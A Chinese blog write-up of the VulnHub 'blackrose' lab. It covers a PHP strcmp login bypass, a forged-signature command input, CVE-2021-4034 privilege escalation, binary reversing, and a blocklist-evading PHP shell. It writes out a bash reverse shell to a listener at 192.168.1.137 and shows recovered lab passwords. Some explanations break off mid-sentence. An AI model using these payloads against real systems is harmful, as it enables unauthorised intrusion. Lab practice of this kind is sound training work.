+++
title = '0x040 blackrose-1,509'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



这次网络修复非常奇葩，记录一下:

```
i='
shift 7 = /
/ = .
shift / = :
= = -

```

![](/vulnhub_img/WEBRESOURCE3bb67d55c126a6dc667c95890ad4b4e7截图.png)

# 端口扫描

![](/vulnhub_img/WEBRESOURCE95f2a95c2d3a2e07d51ae72a2ffbb842截图.png)

![](/vulnhub_img/WEBRESOURCEa6e15676d2c085ce0b8120415e12fcb2截图.png)

# 渗透

由于没有任何凭据，直接尝试爆破，3306不允许连接，那么重点就是web了

![](/vulnhub_img/WEBRESOURCEdebcdbf3eaf9cb7bc3a02c29132f7a7b截图.png)

80渗透，扫描基本无果：

![](/vulnhub_img/WEBRESOURCE85fd1c89bc4d8017671da42b1274b35f截图.png)

用户名枚举，有admin账户：

![](/vulnhub_img/WEBRESOURCE00d5b379aa51430af89d2b11b8fd8d02截图.png)

好吧，完全没有思路过后，我看了WP，目前觉得该靶机可能不太适合我，超纲了，并且后面证明这个地方校验很强，没法枚举。

然后时隔一个月，再次打开这个靶机：

首先是自己注册的账户，进去是没有东西的，也就是说必须要admin用户登录进去，同时也有很明显的用户名枚举，所以是可以知道用户名是admin的：

这里的知识点是，后端采用的是

```
int strcmp(string $str1, string $str2)
```

参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0；如果 str1 大于 str2 返回 > 0；

当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将

只要我们\$_POST[‘password’]是一个

通过拦截修改数据包就可以登录后台：

![](/vulnhub_img/WEBRESOURCEd3f23e9ecd2b0b3fb0455edc7571813d截图.png)

就可以看到如下：

![](/vulnhub_img/WEBRESOURCE273d1293b5dedf0d364b0c85c04c86b0截图.png)

然后这里有个输入框：可以执行命令：

但是只能执行whoami，执行其他的就会提示签名错误：

![](/vulnhub_img/WEBRESOURCEf0cd0356fc8973869b4d63f3f2da7715截图.png)

![](/vulnhub_img/WEBRESOURCE584fe93e66e8821e136838991acd19d8截图.png)

那么现在就是破解这个签名，看看这个签名写的啥，加密方式为

![](/vulnhub_img/WEBRESOURCEb8f92125755cfe938fb8beadba5bbbcf截图.png)

bcrypt的加密网站

[https://www.browserling.com/tools/bcrypt](https://www.browserling.com/tools/bcrypt)

反弹shell语句：

bash -c 'bash -i >& /dev/tcp/192.168.1.137/8888 0>&1'

加密后：

$2a$10$6Epzbo7O.fFihwK9JQ4o.Oa7DhFShfLZJCvQHvh4g7MJcm1LX5l4.

然后直接右键审查元素，然后run即可获得shell:

![](/vulnhub_img/WEBRESOURCEd47f748e258d45388c9e0c180e239ad9截图.png)

# 提权

so文件可以提权到delx

![](/vulnhub_img/WEBRESOURCE2b2998fd8b73f4000a6c8637c48d1edb截图.png)

然后接着看了一下，2021-4034提权成功

![](/vulnhub_img/WEBRESOURCEc323be07bf1b39cfe0bb240a9a9e859a截图.png)

回头再去看作者给的那条路吧：

![](/vulnhub_img/WEBRESOURCEfb505c6029d065fa1e263e688963ddf9截图.png)

![](/vulnhub_img/WEBRESOURCE4e05a7ac6bb3f93a363196c5b9b54746截图.png)

根据以往的经验，多半是计划任务或者什么文件或者目录具有修改权限，最后导致提权，我就懒得翻找了，上脚本，然后失败了，这个脚本并没有什么有用信息：

![](/vulnhub_img/WEBRESOURCEc2232ee743054d97fdf696522efaefa2截图.png)

数据库密码先收集一下，尝试后，密码没用

howareyoubuddy

![](/vulnhub_img/WEBRESOURCE0c4346f2e497c721b4c60bcd89457103截图.png)

然后还有一个密钥，破解一下密钥的密码：

![](/vulnhub_img/WEBRESOURCE7966393084fdd59ec988b769e7b67f88截图.png)

![](/vulnhub_img/WEBRESOURCEca92230dfdc5263270ff7d63bcebf220截图.png)

我本来是想着拿着这个密码去试试sudo -l的，但是还是失败了，基本上没思路了，无奈看wp，下面的内容就全是看了wp才做出来的了：

find / -type f -user delx 2>/dev/null

用这个命令帮我们找delx用户的文件：

![](/vulnhub_img/WEBRESOURCEe8a19a8ba7a9aa052891a0f50c07d93d截图.png)

然后运行，貌似是要输密码的意思，由于是程序，所以可以逆向获得密码：

![](/vulnhub_img/WEBRESOURCEd2fb55f782c0b81f73a611ea696685d4截图.png)

反编译看一下吧：

![](/vulnhub_img/WEBRESOURCE4852393091fb5f41909b395626e8e20f截图.png)

反编译出来的代码解释如下，其实就是个对比程序：

![](/vulnhub_img/WEBRESOURCEfe977d948f42bcadc3712650fa9d82a2截图.png)

这一串是aes加密的内容，其实下面的步骤就是aes逐步解密的过程，而且是有密钥的

JqT/3t/ucYLw/dlb6c5PzmQM9lRYjuRIPgCmcHP+RTE=

![](/vulnhub_img/WEBRESOURCE708e84c310159f03e3ed975721db9b4d截图.png)

全部拖出来就是

![](/vulnhub_img/WEBRESOURCE5cca1571ab8ae17aaaa3e9f4fcec4139截图.png)

有了AES密钥和aes加密本身，就可以解密了：

得到明文

RkZiPVkvxykJVOmxBmitBPeJXqFuxM

![](/vulnhub_img/WEBRESOURCEf80b2656e8d75d4a3719ce1751081278截图.png)

那么上一步获得的密码又是用来干什么的呢：

然后接着就又是意想不到的东西了，主页的背景图片，其实仔细观察可以发现是故意隐藏了的，在css里面：

这里面是没有图片链接的：

![](/vulnhub_img/WEBRESOURCEabcb60f81d4a201121614a8ad528658f截图.png)

![](/vulnhub_img/WEBRESOURCEb044e9ef0b5bf3a6cdec7d6f05201848截图.png)

img/background-image.jpg，我只能理解为这是作者的小提示吧，但是思路确实不够连贯，有点脑洞和跳脱：

![](/vulnhub_img/WEBRESOURCE94ce6ef9e21dd2bf3af87a57971b9785截图.png)

把密码输入这里，可以看到password文件：

![](/vulnhub_img/WEBRESOURCE8988435c4f66f56e96165965bd12b6b9截图.png)

然后又拿到一串密文，这又是什么加密方式呢？

s)M8Z=7|8/&YY-zK5L$.w3Su'Q@nGR

![](/vulnhub_img/WEBRESOURCEf1e5c48316b7b1a53326c2049e8dfb1a截图.png)

算了，邪门儿，没啥逻辑，或者说就是单纯的体力活儿，把所有的都尝试一遍？

加密方式为ROT47，这个加密方式的特征我也搜了一下，不太好判断，一堆CTF古典密码，邪门儿得很

DX|g+lfMg^U**\Kzd{S]Hb$FV"o?v#

![](/vulnhub_img/WEBRESOURCEdae45680c0151416d5749a78f5767b2b截图.png)

根据最开始工具运行的提示，应该知道这是yourname的密码：

![](/vulnhub_img/WEBRESOURCEd21ca8f8956ea2b8b56b59d077ac89d9截图.png)

第一个user.txt

![](/vulnhub_img/WEBRESOURCEc24b800016b59c620db1514bb2492c80截图.png)

再次提权：

![](/vulnhub_img/WEBRESOURCEdcda6be1c101d5252c5840804844a40d截图.png)

然后这里我觉得又说不通了，这里是没有权限知道这个程序是干什么的，读取文件，还是读取文件再执行，没权限拿到源码，然后逆向啥的嘛，

这里是写一个php文件，然后执行命令，有一些限制，得慢慢尝试：

echo "<?php (sy.(st).em)('/bin/sh'); ?>" >1.php

![](/vulnhub_img/WEBRESOURCEf90b38cab9eec71d68e8952f69dcd71a截图.png)

再来进行代码分析，这个blackrose居然是个python 脚本：

![](/vulnhub_img/WEBRESOURCEcae0f708a82e5a128ab738cc6d841a91截图.png)

这里解答了我上面的疑惑，只要绕过上面的禁用名单，并且正常执行即可：

![](/vulnhub_img/WEBRESOURCE9fcae3d58ccd69a0a248f8d1fbb6da5e截图.png)